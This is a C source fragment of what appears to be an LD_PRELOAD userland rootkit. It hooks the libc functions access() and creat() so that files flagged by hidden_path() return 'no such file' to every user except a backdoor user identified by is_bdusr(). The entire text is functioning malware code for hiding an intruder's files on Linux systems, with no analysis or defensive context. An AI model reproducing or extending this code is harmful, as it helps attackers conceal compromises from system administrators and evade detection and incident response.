int access(const char *pathname, int amode){
    hook(CACCESS);
    if(is_bdusr()) return (long)call(CACCESS, pathname, amode);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CACCESS, pathname, amode);
}

int creat(const char *pathname, mode_t mode){
    hook(CCREAT);
    if(is_bdusr()) return (long)call(CCREAT, pathname, mode);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CCREAT, pathname, mode);
}
